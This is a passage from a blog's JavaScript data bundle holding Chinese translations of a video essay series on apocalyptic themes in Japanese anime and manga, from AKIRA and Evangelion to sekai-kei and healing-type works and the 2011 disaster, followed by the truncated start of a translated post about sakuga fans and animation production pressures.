指出不歸父親的社會問題的影響，不信任大人的鐵雄，以及身為孤兒的金田和鐵雄，顯示出了與舊世代的「不連續性」，雙親的缺席／與舊世代的斷絕，對實驗體（Numbers）而言如同父親般存在的上校，對鐵雄來說則只是帶有權威性的大人，在《AKIRA》裡唯一如同雙親存在的只有漫畫版的宮子（ミヤコ），雖然在動畫版裡宮子（ミヤコ）只是做為新興宗教的主題表現，漫畫版的宮子（ミヤコ）是個有著二重性的角色，擁有身為前實驗體（Numbers）而要求鐵雄停止用藥、身為嚴師的一面，我們似乎能在這面上看出她身為真實母親的一面，但這樣講是不夠的。因為末世預言者．教主也是宮子（ミヤコ）真實的一面，在這點上宮子（ミヤコ）和上校一樣是敵人／大人，這種二重性讓人想到新興宗教在「連繫」上的職能，為了將精神性和社會、家族的空洞填補「連繫」起來而出現的新興宗教。「連繫」是個重要的主題，「融合」的鐵雄和阿基拉（アキラ），鐵雄是苦於斷絕的新世代的象徵，阿基拉（アキラ）是舊世代的象徵，兩者宛如後現代主義式的拼貼畫般地完成了融合。</p>\n<p>《AKIRA》所代表的是虛構的時代，並不是改革現有的秩序，而是走向新世界的時代的故事。在結局裡他們「逃向」了新世界，動畫版裡結束於創造新宇宙，漫畫版結束於新國家落成後，兩者的結局都是帶有孤離性的，但兩者有著共通的象徵性，鐵雄和阿基拉（アキラ）的融合是將斷絕的時代性連繫起來的隱喻，他們的獨立國家透過驅逐美軍等等的方式展示了與政治系統的斷絕，但在語言上仍然依賴著舊來的世界，這也是在談論末世論時《AKIRA》的重要性所在，並不只是因為這部作品的影響力之強，還有其主題和在後設等級上的意義，它才會是如此重要的作品，《AKIRA》是戰後日本思想、運動的總括，是後現代式的斷絕敘事，也就是描述了「新世界」的作品。</p>\n<p>聯合赤軍、資本主義和社會主義的興起、世紀末的新興宗教和家庭的缺席、歷史的陰霾和原子彈…簡直就像是戰後日本的造景，全部都存在於同個時空裡。</p>\n<p>如同漫畫版裡重生的大樓群立所表現的，新世界並沒有重新創造秩序，而是構築於既存的秩序上，這並不單只是贊頌著虛構的時代的現實逃避，還存在著批評性的觀點，對於鐵雄的後現代式的實際存在的不安，金田和惠（ケイ）給出了答案，搭上機車離去的結局、他們的友情和伙伴意識，就是在說著，未來存在於離脫舊秩序的年輕人們的伙伴意識裡，當然若要說這是大友克洋的訊息，那也會顯得有些微妙，但的確可以說《AKIRA》精彩地捕捉到了從戰後到 80 年代之間所發生的變化，因此本作在國內外都獲得了相當高的評價，我想以 1945 年至 90 年代前半的時空膠囊來說，沒有比《AKIRA》更優秀的作品了。</p>\n<p>「從末世開始的故事」，天啟的光射入，金田和惠（ケイ）消失於重生的都市之中，虛構的時代的故事。</p>\n<p>然而進入 90 年代後，虛構發生了龜裂…迎來了死亡。</p>\n<p>下一集，我們會講到與末世論相關的虛構故事，是如何連結到「想像與現實」，以及新的災害如何產生新的敘事。</p>\n<h2 id=\"part3eva\">Part3[EVA]</h2>\n<ul>\n<li>影片來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.youtube.com/watch?v=dCKZQphDyLY\">https://www.youtube.com/watch?v=dCKZQphDyLY</a></li>\n<li>日文翻譯：<a target=\"_blank\" rel=\"nofollow\" href=\"https://nico.ms/sm33751637\">https://nico.ms/sm33751637</a></li>\n</ul>\n<p>「然而進入 90 年代後，虛構發生了龜裂…迎來了死亡。」</p>\n<p>那麼，是什麼殺死了虛構呢。</p>\n<p>說「是什麼」聽來像是將原因歸於某個特定的事物，這答案實則會因人而異，不過我們至今看了時代的病理和其解答的末世論，我們可以提出一個有效的問題：「是什麼樣的現實問題，成為了殺死虛構的原因？」</p>\n<p>1995 年前後的日本在末世論文脈下充滿了多樣性和活力，這有 3 個原因，第 1 個是「泡沫經濟崩壞」，自 86 年開始的泡沫景氣於 90 年代走向崩壞，帶來了甚大的損害，終身雇用制度崩毀，非正規雇用增加，薪資停止上漲與通貨膨脹，導致實質薪資開始下降，所謂的「中流意識」開始崩壞，Benedict Anderson 所說的「想像的共同體」——中流階級所抱有對於經濟和社會整體的信賴開始明顯地崩毀。</p>\n<blockquote>\n<p>泡沫崩壞所影響的不只是經濟，</p>\n<p>對於政治、社會、文化也帶來了莫大的影響。</p>\n</blockquote>\n<p>第 2 個是 1995 年的「阪神淡路大震災」，1995 年 1 月 17 日，兵庫縣發生了芮氏規模 7.2 的大地震，造成超過 5000 人死亡，3 萬人以上受傷，以及 30 萬以上的逃難人潮和超過 10 萬棟建築物倒塌崩壞，這在當時是自 1923 年的關東大震災以來，造成最大等級受害的地震，大澤真幸也將這次地震做為大自然表露殘酷的例子，在悠閒的虛構的時代裡的勞動倫理和歸屬意識、對於架空世界的沉溺，這一切全部崩壞的時候，人們還能再做些什麼呢，往虛構的逃避能夠承受住這份現實嗎。</p>\n<p>第 3 個是 1995 年 3 月 20 日所發生的恐攻事件，新興宗教「奧姆真理教」的幹部在地下鐵內，用傘刺破了裝滿沙林毒氣的袋子，造成 12 人死亡，超過 5000 人受傷，其教祖麻原彰晃不斷地重複著末世論性質的預言，教團模仿風之谷和宇宙戰艦大和號製作宣傳動畫，Robert Lifton 說：「在諸多的瘋狂信仰裡，奧姆在實際動身執行末世論這點上是特異的」。我們會在其他的影片裡詳述關於地下鐵沙林事件，因為事件的經過本身和漫畫、動畫沒有關係，但在談論 1995 年之後的次文化時，這是個重要的事件。大澤真幸說道：沙林事件是「虛構的時代的盡頭」，因為這不只代表動畫、漫畫的擴張，還代表了「第三審級」(譯註：The Third Sector，指除了政府單位和一般民營企業之外的專業單位總稱) 的衰退，泡沫崩壞導致了經濟的失墜，震災導致了政府信用的失墜，沙林事件導致了社會規範權力的衰退。</p>\n<p>在數年內接連發生的公共性的崩壞，大澤真幸認為這時進入了 「不可能性的時代」(age of impossibilty)，這已經不再是從現實逃向虛構，而是現實喪失了現實感的時代，不再有能夠再相信的事物，一切看起來都像是惡劣玩笑的時代，也無法回到過去，充滿著這樣的空氣的，90 年代的日本…遇見了庵野秀明／GAINAX 所創造出的金字塔作品，《新世紀福音戰士》(Evangelion)。</p>\n<blockquote>\n<p>曾經存在並做為主體的獨立個體已經消逝，\n現在所有的只有碎片化與去中心化的主觀群體</p>\n<p>Sconce 18, Haunted Media</p>\n</blockquote>\n<p>《Evangelion》，這部自 1995 年到 1996 年間播映的作品，講述的是個 14 歲的少年碇真嗣，被父親命令搭上人造兵器 EVA，和使徒戰鬥的故事，裡頭也有如凌波和明日香等其他的駕駛員登場，在作品前半段並未離脫機器人作品特有的要素，沿襲著基本的故事軸線推進著，然而在真嗣被 Leliel 所吞噬的 16 話後，故事敘事開始進入探討內在，最後曖昧地描寫人類補完計畫，並且迎來真嗣的選擇。《EVA》本質上是拉岡 (譯註：雅各·拉岡，法國的精神學家) 式的作品，我們也能在如第 20 話的標題 (英文副標) 等各處看到對佛洛伊德的引用，所以我認為使用拉岡用語做說明是很適合的，</p>\n<p>拉岡的基本概念有現實界、象徵界、想像界，由於影片長度的關係上，我會將其簡化方便說明，想像界是存在的概念作用，指稱我所看見的我、他人所看見的我，象徵界是將想像界連接起來的系統，例如有著想像界裡的我／Youtuber I，與在想像界裡的你們／觀眾 I 在觀看著我，這之間做為媒體的話語和視覺就是屬於共享的系統／象徵界。現實界非常簡單地來說就是存在於溝通的外部／不可能預測的世界，Slavoj zizek 用了個非常簡明的例子說明，想像界是西洋棋的棋子，這是存在的條件，但其外觀和標籤是非固定的，象徵界是遊戲規則，輔助、限制、定義想像界，騎士只能做出受限的動作，現實界是如玩家或第三者這類存在遊戲外部的要素，由於現實界並不是遊戲本身的構成要素，在那裡發生了什麼是不明的。</p>\n<p>那麼為什麼這對於《EVA》和 90 年代的末世系來說會是重要的呢，因為我們要討論的是「象徵界的失墜」，根據田中素子的節錄：「身邊的人際關係屬於想像界，世界末日這種遙遠抽象的世界屬於現實界。」，這是基於評論家東浩紀說的公共性的崩壞=象徵界的失墜而來的討論。國家和組織成為了遙遠的災害與我們個人之間的媒介的中間項，那麼，你可能會想這樣反駁，如果要說象徵性的失墜，那麼像 NERV 或 SEELE 和其他的軍人又怎麼算，我會如此回答：「《EVA》會如此重要，正是因為它處於先驅的階段」，田中素子也提到：「社會在《EVA》裡是不具重要性的」，例如說真嗣的疑問「為什麼要戰鬥」一直沒有得到明確的答案，NERV 和 SEELE 是象徵界，但並不是規範權力，他們的命令模糊不清，NERV 的目的和與 SEELE 的關係也是直到故事後段和《EOE》才終於明朗，在「明日香來日」裡雖然出現了艦隊和軍人，但也只是配角。</p>\n<p>即使《EVA》在公共性的崩壞這點上是處於過渡期的，個人的問題這點卻殘留了下來：真嗣對於實際存在的問題「身為駕駛員的自己」，真嗣是因為源堂的命令才成為駕駛員，但查爾斯杜安說道：「真嗣的獲得自我和藉由拉岡的『父名』參加象徵界是共通的」，在這層意義上源堂是種記號表現的顯現，規範出真嗣人格的人際關係非常地狹隘，在班上因為被 NERV 選上而受到誇贊，卻因此被冬二痛毆，在第 4 話的逃走故事裡，由於失去了這種自我規範，戰鬥也在精神層面上擁有了更強的意義，和 EVA 的同步是與母親／唯的治療，但 EVA 是以「真正的陌生人」的使徒為基礎所創造出的生物兵器，因此故事必然性地會走向內在的戰鬥，</p>\n<p>在末世論上《EVA》的重要性也在於此，故事循著真嗣前進，有許多身邊的人際關係與自我規範的例子，經營 NERV 的父親、創造出 EVA 的母親、搭上敵對 EVA 的冬二、實則是最後的使徒的渚、一同生活的明日香，真嗣對於自我的概念和來自他人的概念，也就是想像界，是在非常狹小的社會性羈絆中所規定出來的，在《EOE》的最後裡除了凌波和渚以外的群眾都不帶有面貌，中間項幾乎未被描寫，世界異常地平板，和 80 年代的《AKIRA》裡充滿著意義性的群眾相比，《EVA》的世界異常地缺乏活力，在《EVA》裡並不存在能夠帶出世界觀／社會深度的群眾，世界的問題和真嗣的、明日香的、凌波的、源堂的個人的問題混合在一起，</p>\n<p>在我們的現實世界裡也能看見這種「象徵界的失墜」，例如戰爭就可說是種行動規範和政治一同崩壞、秩序象徵已然失墜的空間，Steffanie Thomas 替 TV 版最終回做了簡結：「這是真嗣缺乏自我規範的故事，真嗣領教到自我和他人 兩者都是必要的」，沒有他人便無法理解自己，為了存在，必須要有他人來動搖自我規範，也就是存在＝被他人所認同，這個主題在《EOE》裡也有所描寫，AT 領域的消滅正是隔開想像界的象徵界的消滅，人類補完計畫是將想像界統合，並除去由象徵界所產生出的不安與拒絕的計畫，將自我與他人的界線完全消滅，</p>\n<p>但從中離脫的「明日香」是重點，方才我們說到他人對於自我規範是必要的，對於真嗣來說，必要的他人就是明日香，掐脖子並不只是與內在世界的呼應，也是真嗣內在糾葛的呈現，真嗣由於恐怖而掐了明日香的脖子，卻仍要面對嚴峻的拒絕，但這份嚴峻正是現實的自我形成，也就是即使被拒絕、受到傷害，對於人來說，尋求他者仍然是必要的。這種狹小的關係性與世界末日的並列，產生出了新的敘事形式，90 年代想像力的副產物——「世界系」。</p>\n<blockquote>\n<p>我透過腳踏實地邁向自己的目標，拯救了包含我自己在內的過去，\n並且藉由行動決定了過去的意義。</p>\n<p>Sartre 640, Existentialism and Humanism</p>\n</blockquote>\n<p>「世界系」究竟是什麼？其實世界系並不存在明確的定義，Stefanie Thomas 引用數名評論家的說法，試圖描繪出世界系概念的輪廓，笠井潔稱其為：「主角的與女主角的關係性和世界的破滅這類大問題並列的故事群」，前島賢在自己的撰書裡先提到世界系的難以定義，並稱其是：「描寫少年與少女細小的關係性，以及在世界末日裡，僅有少女和不明確的敵人戰鬥的故事」，宇野常寬認為是「捨去了社會和國家一類的概念，僅將自我意識觸及的範圍做為世界的御宅族系作品」，Christopher Howard 則提及了「做為社會化場所的學校」與「非性的／庇護欲性的『萌的』關係性」，宮台真司則稱其是「縮限於主角內在世界的校園或家庭戲劇」，岡田斗司夫在森川嘉一郎和村上隆的談話裡說是「個人的感情和世界的命運同列的故事」。如同各位所看到的，定義五花八門，但對於作品的特徵的見解大致上是共通的，即使《新世紀福音戰士》是處於前期階段的始祖作品，它也有著共通的部份。</p>\n<p>常見的典型世界系作品有《最終兵器彼女》、《伊莉亞的天空、UFO 的夏天》、《星之聲》，但這些作品裡也有與定義相背之處，在《伊莉亞的天空》裡有著中景／象徵界，《最彼》的修二並不是處於戰爭的情境之外，《星之聲》裡戀愛和世界的問題並沒有關係，那麼讓我們換個問題吧：「世界系試圖去補捉的時代性是什麼？」</p>\n<p>例如《AKIRA》透過斷碎的敘事補捉到了當時次文化的想像力，並透過模仿風格和末世描寫出了「我們應該留給現在以及未來的事物」，新東京的廢墟表現的是年輕人的連繫所創造出的新世界；然而在世界系裡，世界會擅自發生事情，人們只能去接受它，渺小的關係和巨大的問題的抽象性也表現出了這種超越想象界的認識，世界系沒有實體，只要死了就會消失，這在所有作品裡都是共通的，例如《最彼》的戰爭只是個人的問題的對照物，戰爭本身的實體是曖昧的，看不到具有象徵性的連結，《星之聲》和《伊莉亞的天空》也是一樣的，《星之聲》裡兩人的戀愛將世界的問題拋到了腦後，《伊莉亞的天空、UFO 的夏天》是作為給《EVA》的回應所寫的，因此是個有些特殊的例子，而根據 Thomas 所說，此作原案的標題是「UFO 凌波」，也就是一開始所寫的是凌波搭著 UFO 戰鬥的故事，她們都是「戰鬥的少女」：《最彼》裡的千瀨，《星之聲》裡的美加子，《伊里野的天空》裡的伊里野，《EVA》雖然因為戰鬥者是少年這點是屬於過渡期，但在對於母親和少女的依賴這點上是一樣的，田中素子認為世界系裡的少女是低層次的他人／愛的源泉／自我形成的契機。</p>\n<p>所以要說「什麼是世界系？」，宇野常寬在自著書《00 年代的想像力》中使用了「繭居族／心理主義」這個詞彙來說明，宇野常寬將真嗣比喻為繭居族，在這個文脈下說明世界系是「繭居族的末世論」，是朝向想像界的繭居族性撤退，齊藤環在自著《戰鬥美少女的精神分析》裡則說凌波零的人氣來自於其「phallic girl」 (陰莖形象的女孩) 性質，「phallic girl」缺乏實際性，齊藤環也提到了「歐美圈會執著於現實的實際性，在日本這種感覺則較薄弱」，也就是說對於日本的御宅族來說，凌波是失去了象徵界，純粹的想像界的產物，對於末世論的重要性就在於此，在這之前的末世系虛構作品帶有實際性的，它維持住了社會性和秩序象徵，然而在世界系裡的末世是純粹的內在現象，凌波零這個角色體現了這點，Christopher Howard 提到：「對於御宅族來說，像凌波這樣的角色是做為消除參與象徵界所造成的喪失感用的」，同時也可以說是為了消除在現實裡日本的挫折，世界系的「我們」和世界末日的並列，和 90 年代日本的挫折重合了，身邊的關係、遙遠的末世、中間項的挫折，田中素子也提到：「世界系的興盛和 90 年代後繭居族的社會問題化有所關係」，而其還有飛特族和尼特問題，少子高齡化問題吧。</p>\n<p>那麼，「世界系的訊息是什麼？」，至今有各式各樣的解釋，田中素子說：「世界系是透過驅使強大的少女，否認負面的經驗，滿足支配世界的全能感的作品」，小森建太朗說：「世界系缺乏對於成長、友情、勝利的欲望，無法成為大人」，</p>\n<p>那，《EVA》是這樣子的嗎？真嗣真的毫無成長，並且脫離了秩序象徵嗎？此時《EOE》的最後一幕會顯得相當重要，那份痛苦的意義是什麼？我認為《EVA》和世界系所表現出來的東西是，正是在這樣的嚴峻裡，一種對於人生的肯定，裡頭有著對於活在失去意義的社會中的世代的理解，一份簡單卻赤裸的訊息 ——與他人的連繫是痛苦而困難、會悽慘地受傷的東西，但也是有其價值的東西。我認同 Thomas 對於《EVA》的解讀，真嗣會拒絕融合，是因為他知道他人對於自我理解是必要的，藉由唯執行的人類補完計畫會消滅他者性，讓人類成為單一的存在，真嗣那句「我就是我，我想當我自己」的強烈話語呈現出了跨越痛苦的自我規範的重要性。在災難過後日本人的自我規範搖曳不定的時候，《EVA》對於過去和現在和未來放出了強烈的一擊，《EVA》、《最彼》、《伊里野》、《星之聲》是震災的、泡沫崩壞的、奧姆的故事，也是向面對這些的年輕人們拋出「接下來要怎麼做」的問題，這是只有虛構作品才有可能給出的「答案」。</p>\n<p>下一集，我們會聊到動畫如何挑戰他者性，以及走至現代動畫的脈絡。</p>\n<h2 id=\"part-final橫濱購物紀行\">Part Final[橫濱購物紀行]</h2>\n<ul>\n<li>影片來源：<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.youtube.com/watch?v=npLVlJTH_mk\">https://www.youtube.com/watch?v=npLVlJTH_mk</a></li>\n<li>日文翻譯：<a target=\"_blank\" rel=\"nofollow\" href=\"http://www.nicovideo.jp/watch/sm30478904\">http://www.nicovideo.jp/watch/sm30478904</a></li>\n</ul>\n<p>不再有能夠再相信的事物，一切看起來都像是惡劣玩笑的時代，也無法回到過去，充滿著這樣的空氣的 90 年代的日本…遇見了庵野秀明／GAINAX 所創造出的金字塔，《新世紀福音戰士》(Evangelion)。</p>\n<p>有一點很重要的是， 90 年代重要的末世類作品不是只有《EVA》 ，隨著《EVA》出現在御宅族的圈子中，文學也出現了新的類別，那就是「治癒系」，在 90 年代裡有部重要的治癒系漫畫登場，蘆奈野仁的治癒／末世系漫畫《橫濱購物紀行》。</p>\n<p>《橫濱購物紀行》(下稱 YKK) 自 1994 年連載至 2006 年，是一部描寫機器人阿爾法經營來客不多的咖啡店的故事，本作有著終末系的設定，以隨著海面上昇和氣候變動，緩慢地邁向滅亡的文明為舞台，故事本身相當和平，它和治癒系文學有著共通的特徵，1. 平穩簡明而帶有透明感的話語，2. 沉浸在令人舒暢的環境裡的感覺，3. 即使觸及也絕不會知曉答案的謎題，Paul Roquet 將持有以上的三點特徵的故事稱為氣氛系／治癒系，即使看來覺得飄渺，這股舒適感也絕對不會崩壞，不會有危險的事情發生，發生了問題也會回歸平穩，若說《EVA》是拉岡類的末世系，《YKK》就是 「海德格 (馬丁．海德格) 類的末世系」，這裏簡單地為海德格的思想做個說明：我們的自然認識是將事物補捉為 「非本質」 的客體，本質的技術／藝術才能呈現出自然真正的姿態，這種內在的感性亦會呈現在「空間」上。讓我們引用這套說法到《YKK》上，試著思考 「缺少了觀察者的空間會如何？」。</p>\n<p>例如在黃昏的海面上鮮明地照耀著橫須賀的街燈，開始尋找留在相片上的風景的阿爾法，卻因為捨不得相片張數，本想拍攝江之島而未按下快門告終，以照相為目的而開始的「環遊世界」，卻超越其原本目的而包覆住了阿爾法，空間本身所持有的生命感，在第 25 話裡砂灘的雙重性也是一例，不再有人的參與的砂灘和做為海水浴場的砂灘，這種 「令人懷念的『暑假的海水浴場』已經不存在了」 的圖騰主義感，以及街燈樹、大樓香菇與人形香菇的這些姿態，就是讀者 — — 「我們」 所看見的世界的樣貌，看似街燈、大樓、人的這些東西 — — 「他者」，「他者」和「我們」之間的界線出現疑問，《YKK》將我們的思考帶到不同的環境世界裡，蘆奈野仁的描線和網狀繪法也強調了無人背景所帶有的生命感，黑白交織出的景色撼動了以照明為前提的技術世界的感覺，變異物體的概念明確地區分出了環境世界與人類，並同時將其連繫起來，例如颱風過後的緊急設置店面，因為梅雨的聲音與味道而顯得渾然一體的畫面便是一例，諸多讓人聯想到 「回歸」 的畫面， 《YKK》表現出了圓融的生存方式，平穩的末世和接受其的人們，令人感受到一體感和回歸的環境世界／外界，不老不死的阿爾發會做為述說者持續存在，阿爾發做為「相機」讓讀者看見回歸，讀者注視著望著世界的阿爾發，阿爾發和讀者一樣，僅只是看著而無法理解，</p>\n<p>即使在崩壞之後仍在環境世界／外界裡探索著殘存的事物，在泡沫崩壞後唯一留下的治癒，與外界的連繫／人際關係，這在《AKIRA》是被描寫成帶有分裂症特色的、在《EVA》裡是被描寫成人們無法得知的存在，在《YKK》裡的外界融合了前景 (近景)，描繪出其均衡點，這種 「回歸」 可以在許多治癒系作品裡看到， Roquet 說到，治癒系是自 70 年代開始的，帶有日本特性的自我規範文化的一部份，治癒系透過 「前去並歸來」 緩和痛苦，並從根底治癒，治癒風潮可說是為了將震災和沙林的傷痛「復原」 而發生的，在此它和末世論在不同層面上的意義重合，安穩的末世／圓融的死這種悖論現象，對於世界的 「信任」 就是治癒，在這種文脈下《YKK》是回歸社會的，和《EVA》與世界系不同，這種 「圓融」 的概念和某個用語相當類似，那就是在奧姆沙林事件後，由宮台真司所提出的 「沒有盡頭的日常」，</p>\n<p>在富饒而和平的日本活著，就意味著接受什麼都不會發生、停滯的世界，也就是 「沒有盡頭的日常」。人們會被末世所吸引，也是因為能從這種日常的沉悶裡獲得開放感，也就是說，宮台真司的分析認為奧姆沙林事件也是種試圖從 「沒有盡頭的日常」 裡逃脫的嘗試，宇野常寬所引用的 (《完全自殺手冊》裡的)「不會再有巨大的事件了」也是一例，在《YKK》裡所描繪的阿爾發的日常生活也沒有「巨大的事件」，這個考察會連繫到下個段落的「日常系」。</p>\n<p>以《笑園漫畫大王》為首，《幸運星》、《輕音》這一類的「日常系」作品，正是以其「日常生活」為重點，這種也被稱作空氣系的作品類型，重要的是其社會性的側面，這的確只是單純的美少女類作品 (CGDCT，Cute Girls Doing Cute Things)，但其帶有的評論價值是重要的，日常系是近景的故事，相對於連繫了近景和遠景的世界系，日常系只聚焦於近景，強調日常裡所發生的事情，故事楔子等等相當稀薄，藉由排除異性角色的存在，移除了讓故事發展用的戀愛，田中素子將其表現為 「沒有紛爭也沒有煩惱，不存在問題的世界」，以及由聖地巡禮所帶出的虛擬與現實的連接亦為其特徵，宇野常寬說道：「虛構作品的想像力因此成為了對現實產生影響的擴增實境」，例如《幸運星》的鷲宮神社也是種擴張「現在，此處性」的例子，</p>\n<p>末世類作品會毀壞日常生活，普遍來說和日常系的相性並不好，但若將日常系做為輔助線，藉此來考察末世類作品，能夠讓我們更加深切地理解「沒有盡頭的日常」，若活在沒有盡頭的日常裡是種快樂主義，那當其結束時會發生什麼？</p>\n<p>2010 年的冬季動畫《空之音》以末世類作品來說十分有意思，被分配到 Seize 街的五位少女的故事，前半聚焦於彼方如何去適應，例如練習小號與和城鎮人們的交流，雖然也能說這只是有末世類的世界觀，其內容仍是美少女系作品，但這種「末世類的美少女動畫」的概念正是這個作品值得玩味的點，再次重複，日常系是抹去了楔子，排除了異性與戀愛，並藉由聖地巡禮撼動了現實與虛構的區隔，《空之音》批評性地引入了這種特徵，例如故事在後半開始出現波瀾，最後仍回到原點，離開小隊的 Rio 也在最後歸來， タケミカヅチ 的修復也沒有對世界造成巨大的影響，這些都帶有其一定程度的職責性，但沒有帶來終末，砂漠化的世界觀在最後也沒有獲得問題的解決，關於異性缺席，雖然有 Kureha 對 Claus 的憧憬描寫，也因為年齡差距和誤會使得愛情無法結果，實際上 Kureha 和 Claus 的愛情故事也缺乏精鍊，無法成為使日常系崩壞的楔子，以昆卡為原形的 Seize 街也是種聖地巡禮／日常性的機制，《空之音》在整體上使用了許多現實的場景做為原形，貫徹了宇野所說的「擴增現實」性，「現在，此處性」擴張到可說是荒唐的程度，</p>\n<p>但是相對於上述的日常系特徵，其實《空之音》本身有著否定日常系的側面，如 Kureha 對 Claus 的故事有著這樣的側面，雖然最後回到了日常生活，故事的波瀾也提示了自日常系的離脫，無論聖地巡禮／擴增現實，其所在與我們的現實相當遙遠也是一例，在第二話裡學校的廢墟便是個好例子，《空之音》的世界和我們的現實世界在此形成了對比，彼方一行人無法閱讀日文，將其稱為 「遠古象形文字」，且學校與其建築物也不帶有意義，在《笑園漫畫大王》、《幸運星》、《輕音》等等的日常系裡學校是沒有紛爭的空間，在《空之音》則轉變成了「駐屯地」這種戰爭的場所，展現出了對於日常系基礎的批評，刻意地取入了日常生活與戰爭這種兩極化的構造，也就是說，這是部正因為是末世類才可能做出的「日常系悖論」動畫，末世和日常的融合帶有對同時代的批評，Rio 問著「世界的意義」，在《輕音》裡對日常的聚焦，對 Filicia 和《空之音》是不存在的，但在「圓融的生存方式」這點上，《空之音》和《YKK》重合了，在殘存的世界裡和平地活著的人們對於圓融、停滯、均衡的執著，但是相對於《YKK》平穩的「風平浪靜的時代」，《空之音》帶有更強烈的批判性，褒揚著日常的同時仍然追求著變化的態度，和《YKK》是對照性的，並且在 1 年後某件事情的發生，使得肯定現狀的極限變得明顯，我想引用田中素子對於福島的談論，田中談論的是在後現代主義的社會裡核能所處的位置，不過我想關注的是 「圓融的悖論」，</p>\n<p>在 2011 年 3 月 11 日東北地區太平洋一帶發生了大地震，這是日本史上最大的地震，造成了約 16000 人死亡與約 2700 人失蹤，由於地震與海嘯破壞了福島第一核能發電場的 4 座原子爐，即使僅是在末世論的文脈裡，福島第一核電事故的影響力也是極大的，田中素子談及「日本的<a target=\"_blank\" rel=\"nofollow\" href=\"https://ja.wikipedia.org/wiki/%E5%B9%B3%E7%AD%89%E7%A5%9E%E8%A9%B1\">平等神話</a>崩壞」，古川弘子和 Ryana Denison 談及 311 之後的治癒風潮，大林宣彥提及「福島核電事故對於《輝夜姬》故事的影響」，當時宮崎駿也對幾近中斷制作的《來自紅花坂》怒喝道「不管在什麼時候都不要離開工作現場」，在《電腦線圈 W》和《至高指令》裡也出現了後福島的悖論，這裡提出了許多關於第一核電事故的話題，但我主要想講的是其中的，宇野常寬所提及的震災的角色，「在這次的災害之後，人們開始注目於『世界的結構』」</p>\n<p>「並不是震災改變了什麼，只是既有的構造顯露出來了」，這種既存的構造的「揭露」背後有著圓融悖論，平田惠子和 Mark Warschauer 說道：「這不只是東京電力和日本政府之間的意思疎通問題，還有著肯定現狀的理論和不願正視預測的態度」，在其根底有著 「若是要對最糟糕的事態做好準備＝肯定其會發生」 這樣的安全神話，竹熊健太郎談論對於震災後的群眾的掛念時，也提到 「若是人們準備防範災難，或開口談論不安，就會因為言靈而成真」 這種有害的「圓融悖論」，在《YKK》裡所肯定的溫柔、安定、停滯變成了不成熟與官僚主義，「多一事不如少一事」，最後造成了「信用」的失墜。支撐著豐饒生活的系統的「圓融」卻助長了其破壞，治癒系可以說是種去理解何謂破滅，並去編織出渺小圓融的嘗試，但就如同前面所提到的評論，裡頭潛藏著醜陋的一面，</p>\n<p>那麼《空之音》和《橫濱購物紀行》、無盡的日常裡的那份圓融呢？在悲觀和樂觀裡都藏有恐怖，2011 年 4 月 13 日竹熊健太郎在推特上這樣說道：「在 311 後的世界是沒有說明手冊的世界，面向御宅族的表現會開始變質，因為御宅族的生活方式是以豐饒的日常做為前提的。當然漫畫和動畫會殘留下來，但表現的內容會開始改變吧，我不曉得會怎麼改變，但一定會改變，這令我不安也讓我期待。」</p>\n<p>自從我開始做這系列影片已經過了 6 個月，希望各位看的還開心，做為談論末世論系列影片來說是有點虎頭蛇尾的最後一集…我也作了個補充論述的網站，請到我的影片說明欄觀看，很抱歉在沒有明快的結論下結束了，但這仍然是個現在進行系的主題，我覺得也是因此才有趣，如果你們覺得有趣的話，請務必替我的影片點好評和訂閱頻道，願意支持我的人也可以到我的 Patreon 頁面，其實我已經開始製作下個系列的影片，目前已經花了一個月在上頭，感謝各位的觀看。</p>\n","date":"2019-01-29T07:02:26.000Z","excerpt":"","printDate":"January 29, 2019","printReadingTime":"3 min read"};

var route_25 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod25
});

var Mod26 = {"title":"【譯】作畫御宅族的訴願","slug":"ACG-petition-of-sakuga-otaku","html":"<p>文章來源： <a target=\"_blank\" rel=\"nofollow\" href=\"https://togetter.com/li/1059183\">https://togetter.com/li/1059183</a></p>\n<hr>\n<p>搜尋「現在的動畫 作畫」後，會看見很多「以前的動畫作畫比較好」的意見，但仔細看看這些「以前」指的也只是 3、4 年前，這些都只是由於見識淺薄導致的成見。而即便如此你仍然認為「最近的動畫作畫很糟糕」、「作畫崩壞了」，我要再次主張，身為觀眾的你們也要負起一部份的責任。</p>\n<p>「作畫」的第一個搜尋推薦就是「作畫崩壞」，以及搜尋結果裡許多懶人包網站刻意嘲弄「作畫崩壞」的文章，還有以「作畫崩壞」而不是優秀作畫為樂的人們。</p>\n<p>網路上有許多為了貶低寶可夢新作動畫的作畫，而刻意挑出中間張、長鏡頭畫，擴大並截取一部份畫面之後廣傳的惡質人士。擁有良識的觀眾請以觀看「影片」進行判斷。</p>\n<p>我以前曾經到某間動畫公司去參觀，當時參觀了一幕重繪前的海外中間張。這一幕的原畫畫得很好，中間張卻並沒有正確地照著原畫的畫進行繪製，而是「拙劣地重畫」的狀態。當然剩餘的數張中間張也以那張畫當成基準。</p>\n<p>或許你認為這樣一定會再重畫，工作室的人說了「已經沒有從頭重畫的時間，只能在臉部作覆蓋修正(在其它紙上重畫後合成貼上)就要播映了」並還說「現在只要有這樣的畫面，就會馬上在網路上炎上」。</p>\n<p>在知道以高品質聞名的大型工作室的知名作品，都是在這種相當極限的狀況底下製作的事實後，我驚鄂不已。</p>\n<p>現在想起為何當時他要告訴我這些事，或許是希望讓我瞭解動畫製作的現實吧。</p>\n<p>之後那部作品播出，我看了當時看的那一幕的畫面，想著原本是畫得更漂亮的…就有種難以忍受的感覺。只是因為「只有臉部」做了修正，而沒有造成「網路炎上」的狀況。</p>\n<p>在那之後，我在觀看動畫時的印象有了 180 